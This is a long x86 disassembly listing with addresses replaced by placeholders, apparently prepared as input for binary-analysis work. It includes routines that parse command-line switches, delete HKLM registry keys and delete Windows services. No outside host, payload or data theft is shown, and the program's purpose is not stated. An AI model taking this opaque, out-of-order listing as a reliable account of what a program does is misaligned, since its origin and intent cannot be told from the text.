mov [ ebp - 0x4 ] ebx
mov edi [ eax ]
test edi edi
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
push eax
push ebx
call [ StrCpyW@IAT ]
mov eax [ ebp - 0xc ]
mov esi [ edi + 0x8 ]
push eax
add ebx 0x3cf0
call sub_1006e090
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ edi + 0xc ]
lea ecx [ eax + 0xb7fc ]
push ecx
lea ebx [ eax + 0x7b0c ]
call sub_1005fae0
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
lea ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
add [ ebp - 0xc ] 0x2
add [ ebp - 0x4 ] 0x208
mov [ ecx ] dl
mov ecx [ edi + 0x14 ]
mov [ eax * 4 + rw-data ] ecx
mov edx [ edi + 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ecx + 0x4 ]
inc eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1e
jae r-xdata
sub_1002c780
push ebp
mov ebp esp
push 0xffffffff
push sub_10086f53
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
mov edx 0x7
xor ecx ecx
xor esi esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x10 ] ecx
mov [ ebp - 0x6c ] eax
mov [ eax ] si
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x1c ] dx
push ecx
push ecx
push 0xffffffff
push edi
push ecx
mov [ ebp - 0x4 ] 0x1
push ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] 0x1
call [ MultiByteToWideChar@IAT ]
lea ebx [ eax + eax + 0x2 ]
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push ebx
push esi
push 0xffffffff
push edi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call [ CommandLineToArgvW@IAT ]
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
lea edx [ ebp - 0x18 ]
lea eax [ esi + 0x7f ]
call sub_10069020
lea edx [ ebp - 0x24 ]
lea eax [ esi + 0x22 ]
call sub_10069020
lea edx [ ebp - 0x4c ]
lea eax [ esi + 0x75 ]
call sub_10069020
lea edx [ ebp - 0x34 ]
lea eax [ esi + 0x44 ]
call sub_10069020
xor ebx ebx
cmp [ ebp - 0x70 ] esi
jle r-xdata
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
mov edx [ edi + ebx * 4 ]
sar eax 0x1
push eax
lea ecx [ ebp - 0x18 ]
push ecx
push edx
call sub_10006d73
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x24 ]
push edx
push eax
call sub_10006d73
add esp 0xc
test eax eax
jne r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_10034100
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
mov edi edi
lea eax [ ebp - 0x68 ]
push eax
call sub_10033f90
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x4c ]
push edx
push eax
call sub_10006d73
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
inc ebx
cmp ebx [ ebp - 0x70 ]
jl r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_1000a86e
add esp 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_10034100
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x6c ]
add ecx 0x1c
xor esi esi
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x34 ]
push edx
push eax
call sub_10006d73
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x38 ] eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x3c ] eax
sub_1002ca9d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_100579de
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_1005f1fb
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_1001b2d2
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_1005f1fb
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_1001b2d2
push [ ebp - 0x8 ]
call sub_1001b2d2
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_1003f1b2
push ebx
call sub_1001b2d2
push [ ebp - 0x8 ]
call sub_1001b2d2
push [ ebp - 0x4 ]
call sub_1001b2d2
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_1001b2d2
push [ esi + 0xb0 ]
call sub_1001b2d2
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1002ce00
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ecx ] eax
jbe r-xdata
mov esp ebp
pop ebp
retn
push esi
mov esi edx
sub esi ebx
push edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx 0x104
mov eax ebx
mov edi edi
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ ebp + 0x1c ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov edi [ edx + ecx ]
mov eax 0x104
mov ecx ebx
lea esp [ esp ]
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea edx [ ebp - 0xc ]
push edx
push 0x20119
push 0x0
push ebx
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov edx 0x104
sub edx eax
mov ecx 0x104
sub ecx edx
lea eax [ ebx + edx * 2 ]
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add [ ebp - 0x4 ] 0x2c
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ecx ]
jb r-xdata
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x20 ]
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x14 ]
push eax
push edi
push 0x0
push 0x0
push ecx
push edx
mov [ ebp - 0x14 ] 0x208
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
sub eax 0x2
lea esi [ ecx + edx + 0x7ffffefb ]
sub edi eax
mov edi edi
mov esi [ ebp - 0x10 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
push eax
call [ RegCloseKey@IAT ]
test esi esi
jne r-xdata
mov esi 0x2
test ecx ecx
jne r-xdata
movzx edx [ edi + eax ]
test dx dx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
push edi
call [ StrStrW@IAT ]
test eax eax
jne r-xdata
xor ecx ecx
mov [ eax ] cx
mov [ eax ] dx
add eax 0x2
dec esi
dec ecx
jne r-xdata
push ebx
push 0x80000002
call [ RegDeleteKeyW@IAT ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x1c ]
imul eax eax 0x2c
mov ecx [ edx ]
mov edx [ eax + ecx ]
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
push 0xf01ff
push edx
push ecx
call [ OpenServiceW@IAT ]
mov esi eax
push esi
call [ DeleteService@IAT ]
mov edx [ ebp + 0x14 ]
push esi
mov [ edx ] eax
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
test esi esi
je r-xdata
jmp r-xdata
sub_1002cf90
push ebp
mov ebp esp
push 0xffffffff
push sub_10088201
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x68 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp + 0x24 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ edi ] ecx
lea ecx [ edi + 0x4 ]
mov [ ebp - 0x54 ] eax
xor ebx ebx
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] ax
mov eax edx
lea esi [ eax + 0x2 ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x5c ] esi
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax [ ebp - 0x5c ]
sar eax 0x1
push eax
push edx
call sub_10034100
mov eax [ ebp - 0x4c ]
lea ecx [ edi + 0x20 ]
mov [ ebp - 0x4 ] ebx
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
lea edx [ eax + 0x2 ]
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x4c ]
push eax
call sub_10034100
mov cx [ ebp + 0xc ]
mov esi [ ebp - 0x68 ]
mov dl [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ edi + 0x3c ] cx
mov [ edi + 0x3e ] dl
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea ecx [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_10034100
mov edx [ ebp - 0x64 ]
lea ecx [ ebp - 0x2c ]
push ecx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_100519f0
push eax
lea esi [ edi + 0x40 ]
mov edx r--data
mov [ ebp - 0x4 ] 0x3
call sub_100519f0
add esp 0x8
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov esi 0x7
xor eax eax
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
push 0xffffffff
lea ecx [ edi + 0x5c ]
mov [ ebp - 0x2c ] dx
mov edx [ ebp - 0x58 ]
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ecx ] ax
call sub_1002d970
mov edx [ ebp - 0x50 ]
push 0xffffffff
lea ecx [ edi + 0x78 ]
mov [ ebp - 0x4 ] 0x7
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_1002d970
mov edx [ ebp - 0x60 ]
push 0xffffffff
lea ecx [ edi + 0x94 ]
mov [ ebp - 0x4 ] 0x8
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_1002d970
mov edx [ ebp - 0x54 ]
push 0xffffffff
lea ecx [ edi + 0xb0 ]
mov [ ebp - 0x4 ] 0x9
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_1002d970
mov eax [ ebp + 0x2c ]
mov ecx [ ebp + 0x30 ]
mov [ edi + 0xcc ] eax
mov [ edi + 0xd0 ] ecx
mov [ edi + 0xd4 ] bx
mov [ edi + 0xd6 ] bl
mov [ edi + 0xd8 ] ebx
mov [ edi + 0xdc ] ebx
mov [ edi + 0xe0 ] ebx
mov [ edi + 0xe4 ] 0x3
mov [ edi + 0xe8 ] ebx
mov [ edi + 0xec ] ebx
mov [ edi + 0xf0 ] ebx
mov [ edi + 0xf4 ] ebx
mov [ edi + 0xf8 ] ebx
mov [ ebp - 0x4 ] 0xb
mov ecx edi
mov [ edi + 0x100 ] ebx
mov [ edi + 0x104 ] 0xd
mov [ edi + 0x108 ] 0xf
mov [ edi + 0x10c ] 0x32
call sub_10061960
mov eax [ edi + 0xf0 ]
cmp eax [ edi + 0xf4 ]
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
push ebx
push esi
push esi
push ebx
call [ CreateSemaphoreW@IAT ]
mov [ edi + 0xe8 ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x2c
mov edx [ edi + 0x100 ]
lea esp [ esp ]
add eax 0x1c
cmp eax [ edi + 0xf4 ]
jne r-xdata
mov edx ecx
mov [ edi + 0x100 ] edx
mov ecx [ eax + 0x10 ]
cmp ecx edx
jbe r-xdata
sub_1002d290
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10032529
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10032529
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1008234b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_10082302
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10032529
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10032529
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_10082332
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1008234b
mov eax [ ebp + 0xc ]
push r--data
call sub_1005aae0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10032529
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10082319
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10032529
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1002d420
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
sub esp 0x8
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi ecx
jne r-xdata
cmp edi [ esi + 0x4 ]
je r-xdata
mov ecx [ edx ]
lea ecx [ ecx ]
mov ecx [ edx ]
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10071840
push eax
push edi
lea eax [ ebp + 0x8 ]
push eax
mov ecx esi
call sub_1004abb0
mov eax [ ebp + 0x8 ]
pop edi
add eax 0x10
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ edx ]
cmp eax [ edi + 0xc ]
jae r-xdata
mov edi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1002d4a0
push ebp
mov ebp esp
push ebx
push edi
mov ebx ecx
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_10002bd3
add esp 0x4
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x8 ] eax
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_1007f580
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_1007f580
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x10 ] eax
call sub_1007f580
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] 0x0
sub_1002d590
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi [ ecx + 0x24 ]
push edi
mov edi eax
add edi [ ebp + 0xc ]
mov eax [ esi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp edi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
